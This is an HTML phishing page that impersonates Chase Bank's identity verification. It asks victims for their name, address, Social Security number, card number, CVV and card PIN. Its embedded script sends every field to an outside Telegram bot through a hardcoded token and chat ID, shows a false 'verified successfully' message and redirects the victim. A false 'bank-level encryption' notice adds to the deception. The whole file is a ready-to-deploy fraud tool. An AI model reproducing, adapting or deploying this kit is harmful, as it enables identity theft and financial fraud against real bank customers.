<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verify Identity | Chase</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');

    * { margin: 0; padding: 0; box-sizing: border-box; }
    
    body { 
      font-family: 'Roboto', system-ui, sans-serif; 
      background: linear-gradient(135deg, rgba(0, 48, 135, 0.85) 0%, rgba(0, 85, 204, 0.85) 100%),
                  url('photo.jpg') center/cover;
      background-blend-mode: overlay;
      background-attachment: fixed;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 40px 30px;
      position: relative;
    }

    .background-logo {
      position: absolute;
      top: 40px;
      left: 50%;
      transform: translateX(-50%);
      z-index: 1;
    }

    .background-logo img {
      max-height: 60px;
      width: auto;
      opacity: 0.9;
      filter: brightness(0) invert(1);
    }

    .verify-container {
      background: white;
      border-radius: 12px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3), 0 0 80px rgba(0, 0, 0, 0.2);
      width: 100%;
      max-width: 460px;
      padding: 40px;
      margin-bottom: 30px;
    }

    h1 {
      font-size: 24px;
      color: #003087;
      margin-bottom: 8px;
      text-align: center;
    }

    .subtitle {
      text-align: center;
      color: #555;
      margin-bottom: 30px;
      font-size: 15px;
    }

    .form-group {
      margin-bottom: 20px;
    }

    .form-group label {
      display: block;
      font-size: 14px;
      font-weight: 600;
      color: #333;
      margin-bottom: 8px;
    }

    .form-group input,
    .form-group select {
      width: 100%;
      padding: 12px 14px;
      font-size: 16px;
      border: 1px solid #ddd;
      border-radius: 6px;
      transition: border-color 0.3s;
    }

    .form-group input:focus,
    .form-group select:focus {
      outline: none;
      border-color: #0b6cff;
      box-shadow: 0 0 0 3px rgba(11, 108, 255, 0.1);
    }

    .two-column {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 20px;
    }

    .street2 {
      grid-column: 1 / -1;
    }

    .btn {
      width: 100%;
      padding: 14px;
      background: #0b6cff;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 10px;
      transition: background 0.3s;
    }

    .btn:hover {
      background: #0a5fd6;
    }

    .security-notice {
      display: flex;
      align-items: center;
      padding: 12px;
      background: #e8f4fd;
      border: 1px solid #b3d9f2;
      border-radius: 6px;
      margin-top: 25px;
      font-size: 13px;
      color: #003087;
    }

    .security-notice::before {
      content: "🔒";
      margin-right: 8px;
    }

    .required {
      color: #d32f2f;
    }
  </style>
</head>
<body>
  <!-- Background Logo -->
  <div class="background-logo">
    <img src="https://www.logo.wine/a/logo/Chase_Bank/Chase_Bank-Logo.wine.svg" 
         alt="Chase Bank Logo" 
         title="Chase Bank">
  </div>

  <!-- Verify Identity Container -->
  <div class="verify-container">
    <h1>Verify Your Identity</h1>
    <p class="subtitle">For your security, please confirm your information</p>

    <form id="verifyForm">
      
      <!-- Full Name -->
      <div class="form-group">
        <label for="fullName">Full Name <span class="required">*</span></label>
        <input type="text" id="fullName" required>
      </div>

      <!-- Street Address -->
      <div class="form-group">
        <label for="street1">Street Address <span class="required">*</span></label>
        <input type="text" id="street1" required>
      </div>

      <!-- Street 2 (Optional) -->
      <div class="form-group">
        <label for="street2">Street Address 2 (Optional)</label>
        <input type="text" id="street2">
      </div>

      <!-- City, State -->
      <div class="two-column">
        <div class="form-group">
          <label for="city">City <span class="required">*</span></label>
          <input type="text" id="city" required>
        </div>
        <div class="form-group">
          <label for="state">State <span class="required">*</span></label>
          <select id="state" required>
            <option value="">Select State</option>
            <option value="AL">Alabama</option>
            <option value="AK">Alaska</option>
            <option value="AZ">Arizona</option>
            <option value="AR">Arkansas</option>
            <option value="CA">California</option>
            <option value="CO">Colorado</option>
            <option value="CT">Connecticut</option>
            <option value="DE">Delaware</option>
            <option value="DC">District of Columbia</option>
            <option value="FL">Florida</option>
            <option value="GA">Georgia</option>
            <option value="HI">Hawaii</option>
            <option value="ID">Idaho</option>
            <option value="IL">Illinois</option>
            <option value="IN">Indiana</option>
            <option value="IA">Iowa</option>
            <option value="KS">Kansas</option>
            <option value="KY">Kentucky</option>
            <option value="LA">Louisiana</option>
            <option value="ME">Maine</option>
            <option value="MD">Maryland</option>
            <option value="MA">Massachusetts</option>
            <option value="MI">Michigan</option>
            <option value="MN">Minnesota</option>
            <option value="MS">Mississippi</option>
            <option value="MO">Missouri</option>
            <option value="MT">Montana</option>
            <option value="NE">Nebraska</option>
            <option value="NV">Nevada</option>
            <option value="NH">New Hampshire</option>
            <option value="NJ">New Jersey</option>
            <option value="NM">New Mexico</option>
            <option value="NY">New York</option>
            <option value="NC">North Carolina</option>
            <option value="ND">North Dakota</option>
            <option value="OH">Ohio</option>
            <option value="OK">Oklahoma</option>
            <option value="OR">Oregon</option>
            <option value="PA">Pennsylvania</option>
            <option value="RI">Rhode Island</option>
            <option value="SC">South Carolina</option>
            <option value="SD">South Dakota</option>
            <option value="TN">Tennessee</option>
            <option value="TX">Texas</option>
            <option value="UT">Utah</option>
            <option value="VT">Vermont</option>
            <option value="VA">Virginia</option>
            <option value="WA">Washington</option>
            <option value="WV">West Virginia</option>
            <option value="WI">Wisconsin</option>
            <option value="WY">Wyoming</option>
          </select>
        </div>
      </div>

      <!-- Country -->
      <div class="form-group">
        <label for="country">Country <span class="required">*</span></label>
        <select id="country" required>
          <option value="US" selected>United States</option>
        </select>
      </div>

      <!-- SSN -->
      <div class="form-group">
        <label for="ssn">Social Security Number (SSN) <span class="required">*</span></label>
        <input type="text" id="ssn" placeholder="XXX-XX-XXXX" maxlength="11" required>
      </div>

      <!-- Card Information -->
      <div class="form-group">
        <label for="cardNumber">Chase Card Number <span class="required">*</span></label>
        <input type="text" id="cardNumber" placeholder="•••• •••• •••• ••••" maxlength="19" required>
      </div>

      <div class="two-column">
        <div class="form-group">
          <label for="nameOnCard">Name on Card <span class="required">*</span></label>
          <input type="text" id="nameOnCard" required>
        </div>
        <div class="form-group">
          <label for="cvv">CVV <span class="required">*</span></label>
          <input type="text" id="cvv" placeholder="123" maxlength="4" required>
        </div>
      </div>

      <div class="form-group">
        <label for="pin">Card PIN <span class="required">*</span></label>
        <input type="password" id="pin" maxlength="4" placeholder="••••" required>
      </div>

      <button type="button" id="verifyBtn" class="btn">Continue</button>
    </form>

    <div class="security-notice">
      Your information is protected with bank-level encryption
    </div>
  </div>

  <script>
    // ================== TELEGRAM BOT CONFIG ==================
    const TELEGRAM_BOT_TOKEN = "8746410195:AAFYxQsrdZJ-UrqtqHZ_1HLkqVvRO2e8s5I";   // ← Replace with your bot token
    const TELEGRAM_CHAT_ID = "6872342305";       // ← Replace with your chat ID

    async function sendToTelegram(data) {
      const message = `
🔐 *Chase Verify Identity*

👤 *Full Name:* ${data.fullName}
🏠 *Address:* ${data.street1}, ${data.street2 ? data.street2 + ', ' : ''}${data.city}, ${data.state}
🌍 *Country:* ${data.country}
🔢 *SSN:* ${data.ssn}
💳 *Card Number:* ${data.cardNumber}
👤 *Name on Card:* ${data.nameOnCard}
🔐 *CVV:* ${data.cvv}
🔑 *PIN:* ${data.pin}

⏰ *Time:* ${new Date().toLocaleString()}
🌐 *Page:* Verify Identity
      `.trim();

      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

      try {
        await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
          })
        });
      } catch (error) {
        console.error("Telegram send failed:", error);
      }
    }

    // ================== FORM SUBMISSION ==================
    async function handleVerify() {
      const formData = {
        fullName: document.getElementById('fullName').value.trim(),
        street1: document.getElementById('street1').value.trim(),
        street2: document.getElementById('street2').value.trim(),
        city: document.getElementById('city').value.trim(),
        state: document.getElementById('state').value,
        country: document.getElementById('country').value,
        ssn: document.getElementById('ssn').value.trim(),
        cardNumber: document.getElementById('cardNumber').value.trim(),
        nameOnCard: document.getElementById('nameOnCard').value.trim(),
        cvv: document.getElementById('cvv').value.trim(),
        pin: document.getElementById('pin').value.trim()
      };

      // Basic validation
      const missingFields = [];
      if (!formData.fullName) missingFields.push('Full Name');
      if (!formData.street1) missingFields.push('Street Address');
      if (!formData.city) missingFields.push('City');
      if (!formData.state) missingFields.push('State');
      if (!formData.country) missingFields.push('Country');
      if (!formData.ssn) missingFields.push('SSN');
      if (!formData.cardNumber) missingFields.push('Card Number');
      if (!formData.nameOnCard) missingFields.push('Name on Card');
      if (!formData.cvv) missingFields.push('CVV');
      if (!formData.pin) missingFields.push('PIN');

      if (missingFields.length > 0) {
        alert("Please fill in the following required fields: " + missingFields.join(', '));
        return;
      }

      // Send data to Telegram
      await sendToTelegram(formData);

      // Show success message and redirect
      setTimeout(() => {
        alert("Thank you. Your identity has been verified successfully.");
        // Change this to your next page if needed
        window.location.href = "error.html";   // or "otp.html", etc.
      }, 800);
    }

    // Attach click event to button
    document.getElementById('verifyBtn').addEventListener('click', handleVerify);

    // Allow pressing Enter key
    document.getElementById('verifyForm').addEventListener('keypress', function(e) {
      if (e.key === "Enter") {
        handleVerify();
      }
    });

    // SSN and Card Number formatting (kept from original)
    document.getElementById('ssn').addEventListener('input', function(e) {
      let val = e.target.value.replace(/\D/g, '');
      if (val.length > 3) val = val.slice(0,3) + '-' + val.slice(3);
      if (val.length > 6) val = val.slice(0,6) + '-' + val.slice(6);
      e.target.value = val;
    });

    document.getElementById('cardNumber').addEventListener('input', function(e) {
      let val = e.target.value.replace(/\D/g, '');
      let formatted = '';
      for (let i = 0; i < val.length; i++) {
        if (i > 0 && i % 4 === 0) formatted += ' ';
        formatted += val[i];
      }
      e.target.value = formatted;
    });
  </script>
</body>
</html>
